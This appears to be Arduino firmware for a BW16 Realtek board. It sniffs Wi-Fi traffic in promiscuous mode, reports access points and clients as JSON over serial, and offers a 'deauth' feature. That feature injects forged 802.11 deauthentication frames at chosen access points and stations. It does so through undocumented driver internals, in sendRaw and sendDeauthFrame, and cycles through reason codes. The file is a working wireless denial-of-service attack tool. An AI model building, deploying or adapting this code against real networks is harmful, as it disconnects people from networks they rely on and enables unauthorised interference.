//  WARNING: version of AmebaSDK must be 3.1.7 for normal compile
#include <Arduino.h>
#include <wifi_conf.h>
#include <wifi_util.h>
#include <wifi_structures.h>
#include <freertos_pmu.h>
#include <ArduinoJson.h>


extern uint8_t *rltk_wlan_info;
extern "C" void *alloc_mgtxmitframe(void *ptr);
extern "C" void update_mgntframe_attrib(void *ptr, void *frame_control);
extern "C" int dump_mgntframe(void *ptr, void *frame_control);

enum FeatureType {
    FEATURE_NONE,
    FEATURE_SCAN,
    FEATURE_DEAUTH
};

struct ScanOptions {
    uint8_t channels[50];
    uint8_t channelCount;
    unsigned long intervalMs;
};

struct DeauthOptions {
    uint8_t accessPointMac[6];
    bool hasAccessPointMac;
    uint8_t stationMac[6];
    bool hasStationMac;
    uint8_t channel;
};

struct EnabledFeature {
    char id[32];
    FeatureType type;
    union {
        ScanOptions scanOptions;
        DeauthOptions deauthOptions;
    } options;
};

#define MAX_FEATURES 16
EnabledFeature enabledFeatures[MAX_FEATURES];
uint8_t enabledFeatureCount = 0;

static uint16_t global_seq = 0;
bool scanner_active = false;
int current_channel = 1;
unsigned long last_channel_change = 0;
unsigned long last_message_sent = 0;

uint8_t cycle_channels[50];
uint8_t cycle_channel_count = 0;
uint8_t cycle_channel_index = 0;
unsigned long cycle_interval_ms = 10000;

const uint8_t SUPPORTED_CHANNELS[] = {
    1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
    36, 40, 44, 48, 52, 56, 60, 64,
    100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144
};
const uint8_t SUPPORTED_CHANNEL_COUNT = sizeof(SUPPORTED_CHANNELS) / sizeof(SUPPORTED_CHANNELS[0]);

#define MAX_REASON_CODES 8
const uint8_t DEFAULT_REASON_CODES[MAX_REASON_CODES] = {
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08
};
uint8_t deauth_reason_index = 0;

void sendJsonOutput(JsonDocument &doc)
{
    serializeJson(doc, Serial);
    Serial.println();
    last_message_sent = millis();
}

bool isValidChannel(uint8_t channel)
{
    for (uint8_t i = 0; i < SUPPORTED_CHANNEL_COUNT; i++)
    {
        if (channel == SUPPORTED_CHANNELS[i])
            return true;
    }
    return false;
}

void addChannelToCycle(uint8_t channel)
{
    for (uint8_t i = 0; i < cycle_channel_count; i++)
    {
        if (cycle_channels[i] == channel)
            return;
    }
    if (cycle_channel_count < 50)
    {
        cycle_channels[cycle_channel_count++] = channel;
    }
}

void rebuildCycleChannels()
{
    cycle_channel_count = 0;
    cycle_interval_ms = 10000;
    unsigned long min_interval = 10000;

    for (uint8_t f = 0; f < enabledFeatureCount; f++)
    {
        EnabledFeature &feature = enabledFeatures[f];
        if (feature.type == FEATURE_SCAN)
        {
            ScanOptions &opts = feature.options.scanOptions;
            for (uint8_t i = 0; i < opts.channelCount; i++)
            {
                addChannelToCycle(opts.channels[i]);
            }
            if (opts.intervalMs > 0 && opts.intervalMs < min_interval)
            {
                min_interval = opts.intervalMs;
            }
        }
        else if (feature.type == FEATURE_DEAUTH)
        {
            DeauthOptions &opts = feature.options.deauthOptions;
            addChannelToCycle(opts.channel);
        }
    }

    if (cycle_channel_count > 0)
    {
        cycle_interval_ms = min_interval;
        if (cycle_interval_ms < 100)
            cycle_interval_ms = 100;
    }
}

void startScanner()
{
    if (cycle_channel_count == 0)
        return;

    scanner_active = true;
    pmu_set_sysactive_time(0xFFFFFFFF);
    cycle_channel_index = 0;
    current_channel = cycle_channels[0];
    
    wifi_set_channel(current_channel);
    
    last_channel_change = millis();
}

void stopScanner()
{
    scanner_active = false;
    pmu_set_sysactive_time(0);
    cycle_channel_count = 0;
    cycle_channel_index = 0;
    wifi_enable_powersave();

    JsonDocument response;
    response["type"] = "featureStatus";
    response["feature"]["id"] = "scan";
    response["feature"]["type"] = "scan";
    response["feature"]["enabled"] = false;
    sendJsonOutput(response);
}

void parseMAC(String s, uint8_t *mac)
{
    for (int i = 0; i < 6; i++)
        mac[i] = (uint8_t)strtol(s.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
}

void formatMAC(const uint8_t *mac, char *out)
{
    sprintf(out, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

int findFeatureIndex(const char* id)
{
    for (uint8_t i = 0; i < enabledFeatureCount; i++)
    {
        if (strcmp(enabledFeatures[i].id, id) == 0)
            return i;
    }
    return -1;
}

void removeFeature(uint8_t index)
{
    if (index < enabledFeatureCount)
    {
        for (uint8_t i = index; i < enabledFeatureCount - 1; i++)
        {
            enabledFeatures[i] = enabledFeatures[i + 1];
        }
        enabledFeatureCount--;
    }
}

void handleEnableFeature(JsonDocument &doc)
{
    if (!doc.containsKey("feature"))
    {
        JsonDocument errorDoc;
        errorDoc["type"] = "addLog";
        errorDoc["log"]["type"] = "error";
        errorDoc["log"]["message"] = "Missing feature field";
        sendJsonOutput(errorDoc);
        return;
    }

    const JsonObjectConst featureObj = doc["feature"].as<JsonObjectConst>();
    String type = featureObj["type"].as<String>();
    String id = featureObj["id"].as<String>();

    int existingIndex = findFeatureIndex(id.c_str());
    if (existingIndex >= 0)
    {
        removeFeature(existingIndex);
    }

    if (enabledFeatureCount >= MAX_FEATURES)
    {
        JsonDocument errorDoc;
        errorDoc["type"] = "addLog";
        errorDoc["log"]["type"] = "error";
        errorDoc["log"]["message"] = "Maximum features reached";
        sendJsonOutput(errorDoc);
        return;
    }

    EnabledFeature &feature = enabledFeatures[enabledFeatureCount++];
    memset(&feature, 0, sizeof(feature));
    strncpy(feature.id, id.c_str(), sizeof(feature.id) - 1);
    feature.id[sizeof(feature.id) - 1] = '\0';

    if (type == "scan")
    {
        feature.type = FEATURE_SCAN;
        ScanOptions &opts = feature.options.scanOptions;
        opts.channelCount = 0;
        opts.intervalMs = 10000;

        if (featureObj.containsKey("options"))
        {
            const JsonObjectConst options = featureObj["options"].as<JsonObjectConst>();
            if (options.containsKey("channels"))
            {
                const JsonArrayConst channels = options["channels"].as<JsonArrayConst>();
                for (JsonArrayConst::iterator it = channels.begin(); it != channels.end() && opts.channelCount < 50; ++it)
                {
                    uint8_t ch = it->as<uint8_t>();
                    if (isValidChannel(ch))
                    {
                        opts.channels[opts.channelCount++] = ch;
                    }
                }
            }
            if (options.containsKey("intervalMs"))
            {
                opts.intervalMs = options["intervalMs"].as<unsigned long>();
                if (opts.intervalMs < 100)
                    opts.intervalMs = 100;
            }
        }

        if (opts.channelCount == 0)
        {
            for (uint8_t i = 0; i < 14 && opts.channelCount < 50; i++)
            {
                opts.channels[opts.channelCount++] = SUPPORTED_CHANNELS[i];
            }
        }
    }
    else if (type == "deauth")
    {
        feature.type = FEATURE_DEAUTH;
        DeauthOptions &opts = feature.options.deauthOptions;
        opts.hasAccessPointMac = false;
        opts.hasStationMac = false;
        opts.channel = 1;

        if (featureObj.containsKey("options"))
        {
            const JsonObjectConst options = featureObj["options"].as<JsonObjectConst>();
            if (options.containsKey("accessPoint") && !options["accessPoint"].isNull())
            {
                String ap = options["accessPoint"].as<String>();
                if (ap.length() >= 17)
                {
                    parseMAC(ap, opts.accessPointMac);
                    opts.hasAccessPointMac = true;
                }
            }
            if (options.containsKey("station") && !options["station"].isNull())
            {
                String station = options["station"].as<String>();
                if (station.length() >= 17)
                {
                    parseMAC(station, opts.stationMac);
                    opts.hasStationMac = true;
                }
            }
            if (options.containsKey("channel"))
            {
                opts.channel = options["channel"].as<uint8_t>();
                if (!isValidChannel(opts.channel))
                    opts.channel = 1;
            }
        }
    }
    else
    {
        enabledFeatureCount--;
        JsonDocument errorDoc;
        errorDoc["type"] = "addLog";
        errorDoc["log"]["type"] = "error";
        errorDoc["log"]["message"] = "Unknown feature type";
        sendJsonOutput(errorDoc);
        return;
    }

    rebuildCycleChannels();
    startScanner();

    JsonDocument response;
    response["type"] = "enableFeature";
    response["feature"] = featureObj;
    response["feature"]["enabled"] = true;
    sendJsonOutput(response);
}

void handleDisableFeature(JsonDocument &doc)
{
    if (!doc.containsKey("feature"))
    {
        JsonDocument errorDoc;
        errorDoc["type"] = "addLog";
        errorDoc["log"]["type"] = "error";
        errorDoc["log"]["message"] = "Missing feature field";
        sendJsonOutput(errorDoc);
        return;
    }

    const JsonObjectConst featureObj = doc["feature"].as<JsonObjectConst>();
    String id = featureObj["id"].as<String>();
    String type;

    int index = findFeatureIndex(id.c_str());
    if (index < 0)
    {
        JsonDocument errorDoc;
        errorDoc["type"] = "addLog";
        errorDoc["log"]["type"] = "error";
        errorDoc["log"]["message"] = "Feature not found";
        sendJsonOutput(errorDoc);
        return;
    }

    if (enabledFeatures[index].type == FEATURE_SCAN)
        type = "scan";
    else if (enabledFeatures[index].type == FEATURE_DEAUTH)
        type = "deauth";
    else
        type = "unknown";

    removeFeature(index);
    rebuildCycleChannels();

    if (cycle_channel_count == 0)
    {
        stopScanner();
    }

    JsonDocument response;
    response["type"] = "disableFeature";
    response["feature"]["id"] = id;
    response["feature"]["type"] = type;
    response["feature"]["enabled"] = false;
    sendJsonOutput(response);
}

#pragma pack(push, 1)
struct CTSFrame
{
    uint16_t frame_control = 0x00C4;
    uint16_t duration = 0x7FFF;
    uint8_t receiver_addr[6];
};
struct NullFrame
{
    uint16_t frame_control = 0x0148;
    uint16_t duration = 0x0000;
    uint8_t destination[6];
    uint8_t source[6];
    uint8_t bssid[6];
    uint16_t sequence_number = 0;
};
struct DeauthFrame
{
    uint16_t frame_control = 0x00C0;
    uint16_t duration = 0x0100;
    uint8_t dst[6];
    uint8_t src[6];
    uint8_t bssid[6];
    uint16_t sequence_number = 0;
    uint16_t reason = 0x0100;
};
#pragma pack(pop)

void sendRaw(void *frame, size_t len)
{
    if (!rltk_wlan_info)
        return;
    uint8_t *ptr = (uint8_t *)**(uint32_t **)(rltk_wlan_info + 0x10);
    void *f_ctrl = alloc_mgtxmitframe(ptr + 0xae0);
    if (f_ctrl)
    {
        update_mgntframe_attrib(ptr, (void *)((uint8_t *)f_ctrl + 8));
        uint8_t *f_data = (uint8_t *)*(uint32_t *)((uint8_t *)f_ctrl + 0x80) + 0x28;
        memcpy(f_data, frame, len);
        *(uint32_t *)((uint8_t *)f_ctrl + 0x14) = len;
        *(uint32_t *)((uint8_t *)f_ctrl + 0x18) = len;
        dump_mgntframe(ptr, f_ctrl);
    }
}

void sendDeauthFrame(const uint8_t *src_mac, const uint8_t *dst_mac, uint8_t reason)
{
    DeauthFrame df;
    memcpy(df.dst, dst_mac, 6);
    memcpy(df.src, src_mac, 6);
    memcpy(df.bssid, src_mac, 6);
    df.sequence_number = (global_seq++) << 4;
    df.reason = (reason << 8) | reason;
    sendRaw(&df, sizeof(df));
}

bool macMatches(const uint8_t *mac, const uint8_t *target, bool hasTarget, bool prefix)
{
    if (!hasTarget)
        return true;

    for (uint8_t i = 0; i < 6; i++)
    {
        if (prefix)
        {
            if (i < 3 && mac[i] != target[i])
                return false;
        }
        else
        {
            if (mac[i] != target[i])
                return false;
        }
    }
    return true;
}

bool shouldDeauth(const uint8_t *apMac, const uint8_t *stationMac, uint8_t channel)
{
    for (uint8_t f = 0; f < enabledFeatureCount; f++)
    {
        EnabledFeature &feature = enabledFeatures[f];
        if (feature.type != FEATURE_DEAUTH)
            continue;

        DeauthOptions &opts = feature.options.deauthOptions;
        if (opts.channel != channel)
            continue;

        bool apMatch = macMatches(apMac, opts.accessPointMac, opts.hasAccessPointMac, true);
        bool stationMatch = macMatches(stationMac, opts.stationMac, opts.hasStationMac, false);

        if (apMatch && stationMatch)
            return true;
    }
    return false;
}

void extractSSID(const uint8_t *frame, size_t len, char *ssid_out)
{
    size_t pos = 24;
    
    while (pos + 2 < len)
    {
        uint8_t tag = frame[pos];
        uint8_t tag_len = frame[pos + 1];
        
        if (tag_len > 32 || pos + 2 + tag_len > len)
            break;
            
        if (tag == 0x00)
        {
            memcpy(ssid_out, frame + pos + 2, tag_len);
            ssid_out[tag_len] = '\0';
            return;
        }
        
        pos += 2 + tag_len;
    }
    
    ssid_out[0] = '\0';
}

void reportAccessPoint(const uint8_t *bssid, const char *ssid, uint8_t channel, int8_t rssi)
{
    char bssidStr[18];
    formatMAC(bssid, bssidStr);

    JsonDocument doc;
    doc["type"] = "addAccessPoints";
    doc["accessPoints"][bssidStr]["bssid"] = bssidStr;
    doc["accessPoints"][bssidStr]["ssid"] = ssid;
    doc["accessPoints"][bssidStr]["channel"] = channel;
    doc["accessPoints"][bssidStr]["rssi"] = -rssi;
    doc["accessPoints"][bssidStr]["authentication"] = "";
    doc["accessPoints"][bssidStr]["encryption"] = "";
    doc["accessPoints"][bssidStr]["beacons"] = 0;
    doc["accessPoints"][bssidStr]["data"] = 0;
    sendJsonOutput(doc);
}

void reportClient(const uint8_t *mac, int8_t rssi, const uint8_t *bssid)
{
    char macStr[18];
    formatMAC(mac, macStr);

    JsonDocument doc;
    doc["type"] = "addClients";
    doc["clients"][macStr]["mac"] = macStr;
    doc["clients"][macStr]["rssi"] = -rssi;
    doc["clients"][macStr]["probes"] = JsonArray();
    doc["clients"][macStr]["bssid"] = JsonArray();
    doc["clients"][macStr]["data"] = 0;
    
    if (bssid != NULL)
    {
        char bssidStr[18];
        formatMAC(bssid, bssidStr);
        doc["clients"][macStr]["bssid"].add(bssidStr);
    }
    
    sendJsonOutput(doc);
}

void handleDeauthFrame(const uint8_t *srcMac, const uint8_t *dstMac, uint8_t reason)
{
    char srcStr[18], dstStr[18];
    formatMAC(srcMac, srcStr);
    formatMAC(dstMac, dstStr);

    JsonDocument doc;
    doc["type"] = "addLog";
    doc["log"]["type"] = "deauth";
    doc["log"]["source"] = srcStr;
    doc["log"]["destination"] = dstStr;
    doc["log"]["reason"] = reason;
    doc["log"]["channel"] = current_channel;
    sendJsonOutput(doc);
}

void handlePacket(uint8_t type, uint8_t subtype, const uint8_t *addr2, const uint8_t *addr3, const uint8_t *frame, size_t len, int8_t rssi)
{
    (void)type;
    
    if (type == 0x00)
    {
        switch (subtype)
        {
            case 0x04:
                reportClient(addr2, rssi, NULL);
                break;
                
            case 0x05:
            {
                char ssid[33] = {0};
                extractSSID(frame, len, ssid);
                reportAccessPoint(addr2, ssid, current_channel, rssi);
                break;
            }
                
            case 0x08:
            {
                char ssid[33] = {0};
                extractSSID(frame, len, ssid);
                reportAccessPoint(addr3, ssid, current_channel, rssi);
                break;
            }
            
            case 0x0C:
            case 0x0D:
            {
                uint16_t reason = 0;
                if (len > 24)
                {
                    reason = frame[24] | (frame[25] << 8);
                }
                handleDeauthFrame(addr2, addr3, reason & 0xFF);
                break;
            }
        }
    }
    else if (type == 0x08)
    {
        if (addr2[0] != 0xFF && addr2[1] != 0xFF && addr2[2] != 0xFF)
        {
            reportClient(addr3, rssi, addr2);
        }
    }
    else if (type == 0x20)
    {
        if (addr2[0] != 0xFF && addr2[1] != 0xFF && addr2[2] != 0xFF)
        {
            reportClient(addr3, rssi, addr2);
        }
    }
}

void processPacket(unsigned char *buf, unsigned int len, void *userdata)
{
    if (!scanner_active || len < 24)
        return;

    uint8_t fc_hi = buf[0];
    uint8_t type = fc_hi & 0x0F;
    uint8_t subtype = (fc_hi >> 4) & 0x0F;

    int8_t rssi = -127;
    if (userdata != NULL)
    {
        const ieee80211_frame_info_t *info = (const ieee80211_frame_info_t *)userdata;
        if (info->rssi != 0)
            rssi = info->rssi;
    }

    const uint8_t *addr2 = buf + 10;
    const uint8_t *addr3 = buf + 16;
    
    const uint8_t *bssid = NULL;
    const uint8_t *src = NULL;
    
    uint8_t toDs = (buf[1] >> 1) & 0x01;
    uint8_t fromDs = (buf[1] >> 2) & 0x01;
    
    if (type == 0x00)
    {
        if (subtype == 0x08)
        {
            bssid = addr2;
            src = addr2;
        }
        else if (subtype == 0x04)
        {
            src = addr2;
        }
        else if (subtype == 0x05)
        {
            bssid = addr2;
            src = addr2;
        }
        else if (subtype == 0x0C || subtype == 0x0D)
        {
            src = addr2;
        }
    }
    else if (type == 0x08 || type == 0x20)
    {
        if (!toDs && !fromDs)
        {
            src = addr2;
            bssid = addr3;
        }
        else if (!toDs && fromDs)
        {
            src = addr2;
            bssid = addr3;
        }
        else if (toDs && !fromDs)
        {
            bssid = addr2;
            src = addr3;
        }
        else
        {
            bssid = addr2;
            src = addr3;
        }
    }
    
    if (src != NULL && shouldDeauth(bssid ? bssid : addr2, src, current_channel))
    {
        uint8_t reason = DEFAULT_REASON_CODES[deauth_reason_index];
        deauth_reason_index = (deauth_reason_index + 1) % MAX_REASON_CODES;
        sendDeauthFrame(bssid ? bssid : addr2, src, reason);
    }
    
    handlePacket(type, subtype, addr2, addr3, buf, len, rssi);
}

rtw_result_t scan_handler(rtw_scan_handler_result_t *res)
{
    if (res->scan_complete == 0)
    {
        rtw_scan_result_t *ap = &res->ap_details;
        char b[18];
        sprintf(b, "%02X:%02X:%02X:%02X:%02X:%02X", ap->BSSID.octet[0], ap->BSSID.octet[1], ap->BSSID.octet[2], ap->BSSID.octet[3], ap->BSSID.octet[4], ap->BSSID.octet[5]);

        JsonDocument doc;
        doc["type"] = "addAccessPoints";
        doc["accessPoints"][b]["bssid"] = b;
        doc["accessPoints"][b]["ssid"] = (const char *)ap->SSID.val;
        doc["accessPoints"][b]["channel"] = ap->channel;
        doc["accessPoints"][b]["rssi"] = -ap->signal_strength;
        doc["accessPoints"][b]["authentication"] = "";
        doc["accessPoints"][b]["encryption"] = "";
        doc["accessPoints"][b]["beacons"] = 0;
        doc["accessPoints"][b]["data"] = 0;
        sendJsonOutput(doc);
    }
    return RTW_SUCCESS;
}

void processCommand(String &cmd)
{
    cmd.trim();
    if (cmd.length() == 0)
        return;

    JsonDocument doc;
    DeserializationError error = deserializeJson(doc, cmd);

    if (error)
    {
        JsonDocument errorDoc;
        errorDoc["type"] = "addLog";
        errorDoc["log"]["type"] = "error";
        errorDoc["log"]["message"] = "Invalid JSON";
        sendJsonOutput(errorDoc);
        return;
    }

    if (!doc.containsKey("type"))
    {
        JsonDocument errorDoc;
        errorDoc["type"] = "addLog";
        errorDoc["log"]["type"] = "error";
        errorDoc["log"]["message"] = "Missing type field";
        sendJsonOutput(errorDoc);
        return;
    }

    String type = doc["type"].as<String>();

    if (type == "enableFeature")
    {
        handleEnableFeature(doc);
    }
    else if (type == "disableFeature")
    {
        handleDisableFeature(doc);
    }
    else if (type == "getDeviceConfig")
    {
        JsonDocument response;
        response["type"] = "setDeviceConfig";
        response["config"]["id"] = "bw16";
        response["config"]["name"] = "BW16 Scanner";
        response["config"]["driver"] = "bw16";
        
        JsonArray features = response["config"]["features"].to<JsonArray>();
        features.add("scan");
        features.add("deauth");
        
        sendJsonOutput(response);
    }
    else
    {
        JsonDocument errorDoc;
        errorDoc["type"] = "addLog";
        errorDoc["log"]["type"] = "error";
        errorDoc["log"]["message"] = "Unknown type";
        sendJsonOutput(errorDoc);
    }
}

void setup()
{
    Serial.begin(115200);
    delay(100);
    wifi_on(RTW_MODE_PROMISC);
    delay(100);
    wifi_enter_promisc_mode();
    delay(100);
    wifi_set_promisc(3, processPacket, 1);
    pmu_set_sysactive_time(0);

    JsonDocument response;
    response["type"] = "setDeviceConfig";
    response["config"]["id"] = "bw16";
    response["config"]["name"] = "BW16 Scanner";
    response["config"]["driver"] = "bw16";
    
    JsonArray features = response["config"]["features"].to<JsonArray>();
    features.add("scan");
    features.add("deauth");
    
    sendJsonOutput(response);
}

void loop()
{
    if (scanner_active && cycle_channel_count > 0 && millis() - last_channel_change >= cycle_interval_ms)
    {
        cycle_channel_index = (cycle_channel_index + 1) % cycle_channel_count;
        current_channel = cycle_channels[cycle_channel_index];
        wifi_set_channel(current_channel);
        last_channel_change = millis();
    }

    if (millis() - last_message_sent >= 500)
    {
        JsonDocument ping;
        ping["type"] = "ping";
        sendJsonOutput(ping);
    }

    if (Serial.available())
    {
        String cmd = Serial.readStringUntil('\n');
        processCommand(cmd);
    }
}